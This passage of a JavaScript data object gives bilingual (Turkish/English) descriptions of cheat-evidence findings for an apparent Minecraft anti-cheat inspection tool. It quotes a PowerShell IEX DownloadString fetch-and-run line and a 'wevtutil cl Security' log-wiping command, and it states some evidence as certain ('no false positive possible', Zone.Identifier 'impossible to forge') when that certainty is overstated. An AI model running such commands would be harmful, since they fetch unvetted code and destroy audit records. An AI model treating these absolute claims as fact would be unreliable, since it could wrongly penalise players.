          whyConcrete: 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths registry değeri doğrudan hile dizinini içeriyor.'
        },
        en: {
          tacticName: 'Windows Defender Cheat Folder Exclusion (Anti-AV)',
          howItWorks: 'Player added cheat folder to Defender exclusion list, preventing scan of the cheat binary and enabling persistent installation.',
          adminAction: 'Staff Review Guidance: Adding a cheat folder as exclusion proves deliberate, protected cheat installation.',
          whyConcrete: 'Registry exclusion path directly points to known cheat storage directory.'
        }
      },

      // 16. Discord Forensics
      DISCORD_CHEAT_ATTACHMENT_RECORD: {
        tr: {
          tacticName: 'Discord Ek Dosya Önbelleğinde Hile İndirme Kaydı',
          howItWorks: 'Oyuncu, Discord DM veya cheat sunucularından hile JAR/EXE dosyasını indirmiştir. Discord\'un LevelDB önbelleği ve HTTP Cache, CDN URL\'leri ile dosya adlarını kalıcı olarak saklar. Dosya diskten silinmiş olsa bile Discord önbellek kayıtları kalmaya devam eder.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Discord CDN\'den doğrudan hile indirme kaydı, oyuncunun hileye kasıtlı olarak eriştiğini kanıtlar.',
          whyConcrete: 'Discord LevelDB önbellek kayıtlarından çıkarılan CDN URL\'si doğrudan bilinen hile sunucusuna işaret ediyor.'
        },
        en: {
          tacticName: 'Discord Cache Cheat Attachment Download Record',
          howItWorks: 'Player downloaded a cheat JAR/EXE via Discord DM or cheat server. Discord LevelDB cache retains CDN URLs and filenames even after file deletion.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Discord LevelDB cache entry URL directly points to confirmed cheat distribution CDN.'
        }
      },

      // 17. WER / Crash Forensics
      WER_APPCRASH_CHEAT_RECORD: {
        tr: {
          tacticName: 'Windows Hata Raporlama (WER) Hile Çöküş Kaydı',
          howItWorks: 'Hile enjektörleri Minecraft (javaw.exe) içine DLL enjekte ettiğinde, hile kodunda hata veya uyumsuzluk varsa süreç çöker. Windows Error Reporting, her çöküşü %LOCALAPPDATA%\\Microsoft\\Windows\\WER\\ReportArchive içine ve Event ID 1000 kayıtlarına yazar. Bu kayıt, hata veren modülün tam yolunu içerir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Minecraft\'ın Temp veya AppData klasöründeki bilinmeyen bir DLL yüzünden çökmüş olması, harici enjeksiyonun somut kanıtıdır.',
          whyConcrete: 'WER arşivindeki AppCrash kaydı, hatayı tetikleyen modülün tam yolunu ve SHA1 hash\'ini içerir.'
        },
        en: {
          tacticName: 'Windows Error Reporting (WER) Cheat Crash Record',
          howItWorks: 'Cheat injectors crash Minecraft (javaw.exe) when buggy. WER permanently archives crash reports with the faulting module path.',
          adminAction: 'Staff Review Guidance: Minecraft crashing due to unknown temp/AppData DLL proves external injection.',
          whyConcrete: 'WER AppCrash archive contains faulting module full path and SHA1 hash.'
        }
      },

      // 18. Scheduled Task / BITS
      SCHEDULED_CHEAT_TASK_PERSISTENCE: {
        tr: {
          tacticName: 'Zamanlanmış Görev ile Hile Kalıcılığı (Task Scheduler Persistence)',
          howItWorks: 'Profesyonel hile yükleyicileri, oturum açıldığında hilenin otomatik başlaması için Windows Görev Zamanlayıcı\'ya (Task Scheduler) bir görev kaydeder. Bu sayede oyuncu hile dosyasını her seferinde manüel olarak çalıştırmak zorunda kalmaz ve hile arka planda otomatik başlar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Görev Zamanlayıcı\'ya kayıtlı hile başlatıcı, oyuncunun hileyi kalıcı bir sistem servisi gibi kurduğunu kanıtlar. Görevi hemen silin.',
          whyConcrete: 'Windows Görev Zamanlayıcı XML/registry görevi hile binary yolunu veya hile loader URL\'sini içeriyor.'
        },
        en: {
          tacticName: 'Scheduled Task Cheat Persistence (Auto-start on Login)',
          howItWorks: 'Professional cheat loaders register a scheduled task to auto-start the cheat on login, eliminating the need for manual execution.',
          adminAction: 'Staff Review Guidance: Scheduled cheat task proves deliberate persistent cheat installation. Delete the task immediately.',
          whyConcrete: 'Task Scheduler XML contains cheat binary path or download URL.'
        }
      },

      BITS_CHEAT_PAYLOAD_TRANSFER: {
        tr: {
          tacticName: 'BITS Arka Plan Hile İndirmesi (Silent Downloader)',
          howItWorks: 'Background Intelligent Transfer Service (BITS), insan tarafından görünür bir indirme yöneticisi olmadan arka planda dosya indirir. Hile yükleyicileri, hile binary\'ini AV\'den gizlemek ve tarayıcı indirme geçmişini temiz tutmak için BITS kullanır. BITS görevleri Windows Event Log\'da izlenebilir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: BITS aracılığıyla hile indirme, kasıtlı gizli temin etme taktiğidir.',
          whyConcrete: 'BITS iş kaydı, hile CDN URL\'si ve tam indirilen dosya yolu ile doğrulanmıştır.'
        },
        en: {
          tacticName: 'BITS Background Cheat Download (Silent Transfer)',
          howItWorks: 'BITS downloads files silently without visible download manager, allowing cheats to be fetched without browser download history.',
          adminAction: 'Staff Review Guidance: BITS-based cheat download is deliberate covert acquisition.',
          whyConcrete: 'BITS job record contains cheat CDN URL and downloaded file path.'
        }
      },

      // 19. Active Process Detection
      ACTIVE_CHEAT_PROCESS_RUNNING: {
        tr: {
          tacticName: 'Aktif Çalışan Hile/Enjektör Süreci',
          howItWorks: 'Kontrol sırasında sistemde aktif olarak çalışan bir hile istemcisi (Vape, Drip, Slinky, CheatEngine, ProcessHacker, KProcessHacker) tespit edilmiştir. Bu, en doğrudan ve tartışmasız hile kanıtıdır.',
          adminAction: 'ANİ HILE BAN. Aktif çalışan hile süreci tartışmaya yer bırakmayan doğrudan kanıttır. Anında ceza uygulayın.',
          whyConcrete: 'Süreç adı ve yolu doğrudan bilinen hile veya enjektör listesiyle eşleşmiştir. Yanlış pozitif olması teknik olarak imkansızdır.'
        },
        en: {
          tacticName: 'Active Running Cheat / Injector Process',
          howItWorks: 'A known cheat client or injector is actively running in memory during inspection. This is the most direct possible evidence.',
          adminAction: 'IMMEDIATE Staff Review Guidance: Active cheat process requires no further investigation.',
          whyConcrete: 'Process name and path directly match known cheat binary list. No false positive possible.'
        }
      },

      ACTIVE_AUTOCLICKER_RUNNING: {
        tr: {
          tacticName: 'Aktif Otomatik Tıklama Programı (AutoClicker)',
          howItWorks: 'Kontrol anında sistemde Murgee AutoClicker, OP AutoClicker, GS AutoClicker veya benzeri bir otomatik tıklama programı aktif olarak çalışmaktadır. Bu programlar, Minecraft PvP\'de CPS (saniyedeki tıklama) değerini yapay olarak artırır ve oyuncuya savaş avantajı sağlar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: AutoClicker çalışır durumdayken Minecraft oynamak kural ihlalidir.',
          whyConcrete: 'Süreç adı ve yolu doğrudan bilinen autoclicker listesiyle eşleşmiştir.'
        },
        en: {
          tacticName: 'Active AutoClicker Process Running',
          howItWorks: 'An AutoClicker program (Murgee, OP AutoClicker, GS AutoClicker) is running during the inspection, providing unfair CPS advantage in Minecraft PvP.',
          adminAction: 'Staff Review Guidance: Running an AutoClicker while playing Minecraft is a violation.',
          whyConcrete: 'Process name matches known AutoClicker binary list.'
        }
      },

      ACTIVE_CLEANER_TOOL_RUNNING: {
        tr: {
          tacticName: 'Adli Delil Temizleyici (BleachBit / PrivaZer) Aktif',
          howItWorks: 'Kontrol anında veya hemen öncesinde oyuncu, adli delil temizleyici yazılım çalıştırmıştır (BleachBit, PrivaZer, Eraser, Wise Disk Cleaner vb.). Bu yazılımlar prefetch, event log, browser history ve USN journal gibi tüm adli kanıtları siler.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Screenshare kontrolü öncesinde delil temizleme programı çalıştırmak, kuralların en ağır ihlallerinden biridir.',
          whyConcrete: 'Temizleyici süreç, son çalışma zamanı ve silinen artifact kategorileri doğrulanmıştır.'
        },
        en: {
          tacticName: 'Active Forensic Evidence Cleaner Tool (BleachBit/PrivaZer)',
          howItWorks: 'Player ran a forensic cleaner (BleachBit, PrivaZer, Eraser) before or during the screenshare, wiping prefetch, event logs, browser history, and USN journal.',
          adminAction: 'Staff Review Guidance: ',
          whyConcrete: 'Cleaner process and recent wipe artifacts confirmed.'
        }
      },

      // 20. Network / Hosts / Log Clearing
      HOSTS_ANTI_CHEAT_BLOCKED: {
        tr: {
          tacticName: 'Anti-Cheat Sunucusu Hosts Dosyasında Engellenmiş',
          howItWorks: 'Oyuncu, Windows hosts dosyasına (C:\\Windows\\System32\\drivers\\etc\\hosts) anti-cheat güncelleme sunucularını 127.0.0.1\'e yönlendiren kayıtlar eklemiştir. Bu, anti-cheat imza güncellemelerini ve telemetriyi engeller. Bazı hile istemcileri de kendi auth sunucusuna erişimi hosts dosyasına yazarak güvence altına alır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Meşru bir oyuncu için anti-cheat sunucularını engellemek için geçerli hiçbir neden yoktur.',
          whyConcrete: 'Hosts dosyasındaki kayıtlar doğrudan anti-cheat alan adlarını 127.0.0.1\'e yönlendiriyor.'
        },
        en: {
          tacticName: 'Anti-Cheat Server Blocked in Hosts File',
          howItWorks: 'Player added anti-cheat update server domains to Windows hosts file, redirecting them to 127.0.0.1 to block detection signature updates.',
          adminAction: 'Staff Review Guidance: No legitimate player has reason to block anti-cheat servers.',
          whyConcrete: 'Hosts file entries directly redirect anti-cheat domains to loopback.'
        }
      },

      SECURITY_LOG_CLEARED: {
        tr: {
          tacticName: 'Windows Güvenlik Olay Günlüğü Kasıtlı Silindi (Event ID 1102)',
          howItWorks: 'Windows Güvenlik günlüğü (Event ID 1102), sistemde gerçekleşen tüm oturum açma, süreç oluşturma ve kernel audit olaylarını içerir. Oyuncu bu günlüğü "eventvwr.msc" veya "wevtutil.exe cl Security" komutuyla kasıtlı olarak silmiştir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Güvenlik günlüğünü silmek tek başına en ağır ihlallerden biridir. Güvenlik günlüğü silme olayının kendisi (Event ID 1102) başka bir log\'da kayıtlıdır.',
          whyConcrete: 'Event ID 1102 (Security Log Cleared) kaydının bulunması veya günlük boyutunun sıfırlanmış olması doğrulanmıştır.'
        },
        en: {
          tacticName: 'Windows Security Event Log Intentionally Cleared (Event ID 1102)',
          howItWorks: 'Player cleared the Security event log using eventvwr or wevtutil, destroying process creation, login, and kernel audit records.',
          adminAction: 'Staff Review Guidance: The clearing event itself (Event ID 1102) is recorded in other logs.',
          whyConcrete: 'Event ID 1102 detection or zeroed log size is irrefutable evidence of deliberate wiping.'
        }
      },

      PREFETCH_DIRECTORY_WIPED: {
        tr: {
          tacticName: 'Windows Prefetch Klasörü Temizlenmiş (Hile Çalıştırma İzleri Silindi)',
          howItWorks: 'Windows Prefetch klasörü (C:\\Windows\\Prefetch), normal bir sistemde 50-200+ arasında .pf dosyası içerir. Prefetch devre dışı bırakılmamışsa ve klasörde 10\'dan az dosya varsa, oyuncu temizleyici yazılım kullanarak cheat .pf dosyalarını silmiştir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Prefetch\'in temizlenmesi hile çalıştırma izlerini yok etme girişimidir.',
          whyConcrete: 'Prefetch sayısı ve sistem durumu doğrulanmıştır. Beklenenden dramatik şekilde az dosya anti-forensics göstergesidir.'
        },
        en: {
          tacticName: 'Windows Prefetch Directory Wiped (Execution Traces Destroyed)',
          howItWorks: 'A normal Windows system has 50-200+ prefetch .pf files. Fewer than 10 indicates deliberate wiping to hide cheat execution traces.',
          adminAction: 'Staff Review Guidance: Prefetch wiping destroys execution history.',
          whyConcrete: 'Prefetch count dramatically below normal range. Confirmed anti-forensics wipe.'
        }
      },

      // 21. NTFS ADS / Zone.Identifier
      NTFS_HIDDEN_ADS_PAYLOAD: {
        tr: {
          tacticName: 'NTFS Alternatif Veri Akışı (ADS) Gizli Yük',
          howItWorks: 'NTFS dosya sistemi, bir dosyaya birden fazla "veri akışı" (data stream) eklenmesine izin verir. Hileciler, hile EXE dosyasını masum bir metin dosyasının (file.txt:payload.exe) içine gizler. Normal dosya tarayıcıları ve Windows gezgini yalnızca ana akışı (file.txt) gösterir, gizli akışı göremez.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Dosya içine gizlenmiş executable ADS, %100 kasıtlı hile gizleme taktiğidir.',
          whyConcrete: 'NTFS düşük seviyeli API sorgusuyla gizli veri akışı adı ve boyutu doğrulanmıştır.'
        },
        en: {
          tacticName: 'NTFS Alternate Data Stream Hidden Payload',
          howItWorks: 'NTFS allows multiple data streams per file. Cheats hide executables inside innocent files (file.txt:payload.exe), invisible to standard file browsers.',
          adminAction: 'Staff Review Guidance: Hidden executable ADS is 100% deliberate cheat concealment.',
          whyConcrete: 'Hidden stream name and size verified via low-level NTFS API query.'
        }
      },

      ZONE_IDENTIFIER_CHEAT_ORIGIN: {
        tr: {
          tacticName: 'Zone.Identifier Web Kaynağı — Hile Sitesinden İndirildi',
          howItWorks: 'Windows, internetten indirilen her dosyaya Zone.Identifier adlı gizli bir ADS (Alternate Data Stream) ekler. Bu stream, dosyanın indirildiği URL\'yi ve kaynak bölgesini içerir. Hile sitesinden indirilen dosyalarda bu URL doğrudan hile sunucusunu gösterir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Zone.Identifier Windows tarafından otomatik oluşturulur, sahte oluşturulması neredeyse imkansızdır. Hile sitesinden doğrudan indirme kanıtlanmıştır.',
          whyConcrete: 'Zone.Identifier ADS içindeki referrer URL, doğrudan bilinen hile alan adını işaret etmektedir.'
        },
        en: {
          tacticName: 'Zone.Identifier Web Mark Proves Cheat Site Download',
          howItWorks: 'Windows automatically adds Zone.Identifier ADS to every internet download, containing the source URL. Cheat-site downloads point directly to the cheat domain.',
          adminAction: 'Staff Review Guidance: Zone.Identifier is automatically created by Windows; impossible to forge. Proves direct download from cheat site.',
          whyConcrete: 'Zone.Identifier referrer URL directly matches confirmed cheat distribution domain.'
        }
      },

      // 22. JVM Injection
      UNAUTHORIZED_JVM_ATTACH_API_INJECTION: {
        tr: {
          tacticName: 'JVM Attach API Üzerinden Yetkisiz Bytecode Enjeksiyonu',
          howItWorks: 'Linux\'ta /tmp/.java_pid<PID> soketi, JVM\'e harici araç bağlanmasını sağlar. Hile yazılımları bu sokete bağlanarak Minecraft\'ın JVM\'ine dinamik olarak bytecode enjekte eder — çalışan sınıfların metodlarını değiştirir, ESP/Killaura ekler — bütün bunları hiçbir dosya yazmadan yapar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Harici sürecin Minecraft JVM\'ine Attach API soketi üzerinden bağlanması, bellekte doğrudan bytecode manipülasyonu anlamına gelir.',
          whyConcrete: '/proc/[pid]/fd sembolik bağlantı analizi, harici süreci JVM soketine bağlı olarak doğrudan tespit etmiştir.'
        },
        en: {
          tacticName: 'Unauthorized JVM Attach API Bytecode Injection',
          howItWorks: 'External process connects to Minecraft JVM via /tmp/.java_pid socket, dynamically injecting bytecode to modify game classes at runtime — adding ESP, Killaura, etc. — without writing any files.',
          adminAction: 'Staff Review Guidance: External process attached to Minecraft JVM = direct in-memory bytecode manipulation.',
          whyConcrete: '/proc/[pid]/fd symlink analysis directly confirmed external process attached to JVM socket.'
        }
      },

      JVM_AGENT_ATTACHED: {
        tr: {
          tacticName: '-javaagent / -Xbootclasspath ile JVM Bytecode Enjeksiyonu',
          howItWorks: 'Hile başlatıcıları, Minecraft\'ı başlatırken JVM\'e "-javaagent:cheat.jar" veya "-Xbootclasspath/p:cheat.jar" argümanı ekler. Bu mekanizma, hile JAR\'ının her Java sınıfı yüklenmeden önce çalışmasını sağlar ve sınıfları (örn. Reach, KillAura) bytecode seviyesinde değiştirir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Meşru bir Minecraft kurulumuna -javaagent eklenmesinin geçerli hiçbir sebebi yoktur. Bu, bir hile yükleme mekanizmasıdır.',
          whyConcrete: 'javaw.exe komut satırındaki -javaagent argümanı doğrudan tespit edilmiştir.'
        },
        en: {
          tacticName: 'JVM Agent / -Xbootclasspath Bytecode Injection',
          howItWorks: 'Cheat launchers add -javaagent:cheat.jar or -Xbootclasspath/p:cheat.jar to Minecraft JVM args, allowing cheat to intercept and modify every class before it runs.',
          adminAction: 'Staff Review Guidance: No legitimate Minecraft installation uses -javaagent. This is a cheat loading mechanism.',
          whyConcrete: 'javaw.exe command line directly contains -javaagent argument pointing to cheat jar.'
        }
      },

      // 23. DNS / Network
      DNS_CHEAT_AUTH_ACCESSED: {
        tr: {
          tacticName: 'Hile Auth/Lisans Sunucusuna DNS Sorgusu Tespit Edildi',
          howItWorks: 'Vape, Drip ve Slinky gibi premium hile istemcileri, aktif olduklarında lisans doğrulaması için kendi sunucularına (örn. vape.gg, drip.to, slinky.gg) bağlanır. Windows DNS Resolver Cache, bu sorguları kısa süreliğine saklar. Oyuncu hileyi silse bile DNS önbelleği birkaç saat kalabilir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Hile auth sunucusuna DNS sorgusu, hilenin aktif olarak kullanıldığını kanıtlar.',
          whyConcrete: 'Windows DNS Resolver Cache\'den doğrudan çıkarılan hile auth domain\'i doğrulanmıştır.'
        },
        en: {
          tacticName: 'Cheat Authentication Server DNS Query Detected',
          howItWorks: 'Premium cheats like Vape, Drip, Slinky phone home for license validation. Windows DNS cache retains these queries for hours even after cheat deletion.',
          adminAction: 'Staff Review Guidance: DNS query to cheat auth server proves cheat was actively running.',
          whyConcrete: 'Cheat auth domain directly extracted from Windows DNS Resolver Cache.'
        }
      },

      // 24. USB
      USB_STORAGE_RECENTLY_INSTALLED: {
        tr: {
          tacticName: 'Kontrol Öncesinde USB Depolama Takıldı (Hile Gizleme Şüphesi)',
          howItWorks: 'Screenshare kontrolünden hemen önce bir USB depolama aygıtı takılmıştır. Hileciler, hile binary\'ini USB\'ye kaydedip kontrolden önce çıkararak disk üzerinde iz bırakmaktan kaçınırlar. Hile USB\'den çalıştırılır, tarama sonrası USB çıkarılır.',
          adminAction: 'ŞÜPHELİ DURUM. Kontrol sırasında USB\'ye erişim geçmişini sorgulayın ve diskten açık hile yoksa diğer kanıtları değerlendirin.',
          whyConcrete: 'HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR registry\'sinden USB takılma zamanı doğrulanmıştır.'
        },
        en: {
          tacticName: 'USB Storage Recently Installed (Cheat Concealment Suspicion)',
          howItWorks: 'A USB storage device was plugged in immediately before the screenshare check. Cheaters run cheats from USB to avoid disk traces, then remove the drive.',
          adminAction: 'SUSPICIOUS — Investigate USB access history. Evaluate alongside other findings.',
          whyConcrete: 'USB installation timestamp confirmed from HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR.'
        }
      },

      // 25. Process Ghosting / Memory Injection
      PROCESS_GHOSTING_DELETED_MODULE: {
        tr: {
          tacticName: 'Process Ghosting — Diskten Silinmiş Ama Bellekte Çalışan Kod',
          howItWorks: 'Hile yazılımı, kendi binary\'ini diske yazar, süreci başlatır, ardından binary\'i diskten siler. İşletim sistemi, çalışan süreci bellekte tutmaya devam eder ancak dosya artık diskten okunamaz. Linux\'ta /proc/[pid]/exe sembolik bağlantısı "(deleted)" olarak görünür. Bu teknik, dosya tarama araçlarından kaçmak için kullanılır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Diskten silinmiş ama bellekte aktif çalışan bir binary, çekirdek düzeyinde müdahalenin somut kanıtıdır.',
          whyConcrete: '/proc/[pid]/exe symlink doğrudan "(deleted)" durumunu ve Minecraft ilişkili süreç olduğunu kanıtlamıştır.'
        },
        en: {
          tacticName: 'Process Ghosting — Deleted Binary Still Executing in Memory',
          howItWorks: 'Cheat writes binary, starts the process, then deletes the file from disk while still running in memory. On Linux, /proc/[pid]/exe shows "(deleted)". Evades all file-based scanners.',
          adminAction: 'Staff Review Guidance: Deleted-but-running binary is concrete evidence of kernel-level interference.',
          whyConcrete: '/proc/[pid]/exe symlink directly confirmed "(deleted)" status with Minecraft-related process.'
        }
      },

      // 26. SRUM
      SRUM_APPLICATION_EXECUTION_RECORD: {
        tr: {
          tacticName: 'SRUM (Sistem Kaynak Kullanım İzleme) Hile Çalıştırma Kaydı',
          howItWorks: 'Windows System Resource Usage Monitor (SRUM), her uygulamanın ağ trafiği, CPU ve bellek kullanımını SRUDB.dat veritabanında günler boyunca saklar. Bu kayıtlar, Recycle Bin boşaltıldıktan ve USN journal silindikten sonra dahi mevcuttur. Hile binary\'i için ağ baytları ve çalışma süresi doğrulanabilir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: SRUM kaydı, hile binary\'inin belirli tarihlerde aktif olarak çalıştığını ve ağ bağlantısı yaptığını kanıtlar.',
          whyConcrete: 'SRUDB.dat ESE veritabanından çıkarılan kayıt, hile sürecinin çalışma süresi ve ağ aktivitesini içeriyor.'
        },
        en: {
          tacticName: 'SRUM (System Resource Usage Monitor) Cheat Execution Record',
          howItWorks: 'Windows SRUM records network bytes, CPU and memory usage per application in SRUDB.dat for days. Persists after Recycle Bin emptying and USN journal wiping.',
          adminAction: 'Staff Review Guidance: SRUM proves cheat binary was actively running on specific dates with network activity.',
          whyConcrete: 'SRUDB.dat ESE database record contains cheat process runtime and network activity.'
        }
      },

      // 27. Recycle Bin
      RECYCLE_BIN_DELETED_CHEAT: {
        tr: {
          tacticName: 'Geri Dönüşüm Kutusu\'nda Silinmiş Hile Binary\'i',
          howItWorks: 'Oyuncu hile dosyasını silmiş ancak Geri Dönüşüm Kutusu\'nu boşaltmamıştır. Windows, silinen her dosyayı $RECYCLE.BIN klasörüne $I (metadata) ve $R (içerik) çifti olarak taşır. $I dosyası silme tarihini ve orijinal yolu içerir. Dosya tam olarak geri getirilebilir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Geri Dönüşüm Kutusu\'ndaki hile dosyası geri yüklenebilir durumda. Hem hile bulgusu hem de eksik delil karartma girişimi.',
          whyConcrete: '$I metadata dosyasından orijinal yol ve silme tarihi çıkarılmış, $R içerik dosyası mevcuttur.'
        },
        en: {
          tacticName: 'Deleted Cheat Binary Found in Recycle Bin',
          howItWorks: 'Player deleted the cheat but did not empty Recycle Bin. Windows stores $I (metadata) and $R (content) pairs in $RECYCLE.BIN. File is fully recoverable.',
          adminAction: 'Staff Review Guidance: Recoverable cheat file in Recycle Bin is both cheat evidence and incomplete evidence destruction.',
          whyConcrete: '$I metadata file contains original path and deletion timestamp; $R content file exists and is recoverable.'
        }
      },

      // 28. LOLBin / WMI / Reflective DLL
      LOLBIN_CHEAT_INJECTION_ABUSE: {
        tr: {
          tacticName: 'LOLBin (Meşru Windows Aracı) Kötüye Kullanımı ile Hile Enjeksiyonu',
          howItWorks: 'Hileciler, AV yazılımlarının doğrudan hile binary\'ini bloke etmesini önlemek için regsvr32.exe, mshta.exe, wscript.exe veya rundll32.exe gibi meşru Windows araçlarını (LOLBin) kötüye kullanır. Bu araçlar hile kodunu URL\'den veya encoded script olarak çalıştırır. AV, güvenilir bir sistem binary\'i çalıştığını düşünerek engel koymaz.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Meşru Windows aracının hile payload\'u ile çalıştırılması, profesyonel düzeyde AV bypass taktiğidir.',
          whyConcrete: 'Windows Security Event Log Event ID 4688, LOLBin\'in şüpheli argümanlarla çalıştırıldığını kayıt altına almıştır.'
        },
        en: {
          tacticName: 'LOLBin (Legitimate Windows Binary) Abuse for Cheat Injection',
          howItWorks: 'Cheaters abuse legitimate Windows tools (regsvr32, mshta, wscript, rundll32) to execute cheat payloads, bypassing AV that trusts signed system binaries.',
          adminAction: 'Staff Review Guidance: Abusing system binaries for cheat injection is professional-level AV bypass.',
          whyConcrete: 'Windows Security Event Log Event ID 4688 recorded LOLBin execution with suspicious arguments.'
        }
      },

      REFLECTIVE_DLL_TEMP_PE_FILE: {
        tr: {
          tacticName: 'Reflective DLL Injection — Temp\'de PE Dosyası (Gizlenmiş Executable)',
          howItWorks: 'Reflective DLL Injection, bir DLL\'i diske yazmadan doğrudan bellekten yükler. Ancak bazı enjektörler önce DLL\'i Temp klasörüne .dat, .tmp veya .bak uzantısıyla yazar, enjekte eder, sonra siler. Bu kısa süre içinde veya silme başarısız olursa iz kalır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Temp klasöründe PE başlığı taşıyan dosya, doğrudan hile enjeksiyon sürecinin kanıtıdır.',
          whyConcrete: 'MZ (0x4D5A) ve PE (0x5045) header imzası ikili dosyada doğrulanmış, uzantı uyumsuzluğu tespit edilmiştir.'
        },
        en: {
          tacticName: 'Reflective DLL Injection — PE File Disguised in Temp',
          howItWorks: 'Some injectors write cheat DLL to Temp as .dat/.tmp/.bak before injection. PE header verification reveals the disguised executable.',
          adminAction: 'Staff Review Guidance: PE-headered file in Temp with wrong extension is direct cheat injection process evidence.',
          whyConcrete: 'MZ+PE header signatures verified in binary, extension mismatch confirmed.'
        }
      },

      POWERSHELL_SCRIPTBLOCK_CHEAT_EXECUTION: {
        tr: {
          tacticName: 'PowerShell Komut Bloğu Günlüğünde Hile Çalıştırma Kaydı',
          howItWorks: 'Windows PowerShell Script Block Logging (Event ID 4104), çalıştırılan tüm PowerShell komutlarını kaydeder. Hile yükleyicileri genellikle "IEX (New-Object Net.WebClient).DownloadString(\'https://vape.gg/loader.ps1\')" gibi komutlar çalıştırır. Bu kayıtlar PowerShell kapatıldıktan sonra bile sistemde kalır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: PowerShell üzerinden hile indirme ve çalıştırma kaydı tartışmasız kanıttır.',
          whyConcrete: 'Windows PowerShell/Operational Event ID 4104\'te hile URL\'si veya enjeksiyon komutunu içeren script bloğu doğrulanmıştır.'
        },
        en: {
          tacticName: 'PowerShell Script Block Log Cheat Execution Record',
          howItWorks: 'PowerShell Script Block Logging (Event ID 4104) records all executed PS commands. Cheat loaders often execute IEX DownloadString commands pointing to cheat URLs.',
          adminAction: 'Staff Review Guidance: PowerShell-recorded cheat download/execution is irrefutable evidence.',
          whyConcrete: 'PowerShell/Operational Event ID 4104 script block contains cheat URL or injection command.'
        }
      },

      LINUX_TAINTED_KERNEL: {
        tr: {
          tacticName: 'Linux Tainted Kernel Bilgilendirmesi',
          howItWorks: 'Linux çekirdeği harici veya kapalı kaynaklı bir donanım sürücüsü (NVIDIA ekran kartı sürücüsü, kablosuz ağ sürücüsü veya WireGuard/VirtualBox modülü) yüklendiğinde "tainted" (işaretli) bayrağı alır. Bu durum bir hile veya güvenlik ihlali değildir; tamamen meşru donanım sürücülerinin varlığını gösterir.',
          adminAction: 'BİLGİ / CEZA GEREKTİRMEZ. Sistemde NVIDIA veya harici donanım sürücüsü bulunmaktadır, temiz durumdur.',
          whyConcrete: '/proc/sys/kernel/tainted çekirdek bayrağı okunmuştur.'
        },
        en: {
          tacticName: 'Linux Tainted Kernel Information',
          howItWorks: 'The Linux kernel sets the "tainted" flag when proprietary or out-of-tree hardware drivers (such as NVIDIA GPU drivers, Wi-Fi drivers, WireGuard, or VirtualBox modules) are loaded. This is not a cheat or security exploit; it merely reflects third-party hardware modules.',
          adminAction: 'INFORMATIONAL / NO PENALTY. System has proprietary hardware or virtual device drivers loaded.',
          whyConcrete: '/proc/sys/kernel/tainted value retrieved from kernel.'
        }
      },

      DELETED_CHEAT_IN_LINUX_TRASH: {
        tr: {
          tacticName: 'Linux Çöp Kutusuna Atılmış Hile Dosyası',
          howItWorks: 'Oyuncu kontrol öncesinde hile JAR veya ikili dosyasını silmiş ancak çöp kutusunu (~/.local/share/Trash) boşaltmamıştır. Linux FreeDesktop Trash spesifikasyonu, silinen dosyanın orijinal yolunu ve silinme zaman damgasını .trashinfo dosyasında saklar.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Çöp kutusundaki dosya orijinal adı, silinme tarihi ve içerik imzasıyla kesin kanıttır.',
          whyConcrete: 'Linux Trash storage ve .trashinfo kayıtları somut adli delildir.'
        },
        en: {
          tacticName: 'Deleted Cheat in Linux Trash Bin',
          howItWorks: 'The player deleted cheat binaries before screenshare but failed to empty the trash (~/.local/share/Trash). FreeDesktop trash specifications preserve the original file path and exact deletion timestamp.',
          adminAction: 'Staff Review Guidance: Recovered cheat binary with deletion timestamp is indisputable forensic proof.',
          whyConcrete: 'Linux Trash info metadata and recovered binary provide 100% concrete proof.'
        }
      },

      LINUX_JOURNAL_WIPED: {
        tr: {
          tacticName: 'Linux Systemd Adli Günlükleri Temizlenmiş',
          howItWorks: 'Sistem uzun süredir açık olmasına rağmen /var/log/journal ve /run/log/journal dizinlerindeki systemd günlükleri tamamen boşaltılmış veya silinmiştir. Bu durum oyuncunun denetimden önce sistem loglarını kasıtlı olarak sildiğini gösterir.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Adli günlüklerin kasıtlı silinmesi denetimden kaçma girişimidir.',
          whyConcrete: 'Sistem açık kalma süresine rağmen tüm systemd günlükleri sıfırlanmıştır.'
        },
        en: {
          tacticName: 'Linux Systemd Journal Wiped',
          howItWorks: 'Systemd logs have been deliberately vacuumed or deleted while uptime is substantial, destroying process execution history and user session logs.',
          adminAction: 'Staff Review Guidance: Deliberate wiping of system audit logs proves screenshare evasion.',
          whyConcrete: 'Systemd journal directories are empty despite extended system uptime.'
        }
      },

      PTRACE_INJECTION_ATTACHED: {
        tr: {
          tacticName: 'Linux ptrace Bellek İzleme ve Enjeksiyonu',
          howItWorks: 'Minecraft JVM sürecine harici bir program ptrace() sistem çağrısıyla bağlanmıştır (/proc/PID/status TracerPid > 0). ptrace, bağlanan sürecin Minecraft bellek alanını doğrudan okuyup yazmasına (hook atmasına) olanak tanır.',
          adminAction: 'Yetkili İnceleme Tavsiyesi: Oyuna dışarıdan izleyici süreç bağlanmıştır.',
          whyConcrete: 'TracerPid > 0 somut çekirdek seviyesi süreç izleme kanıtıdır.'
        },
        en: {
          tacticName: 'Linux ptrace Memory Injection Attached',
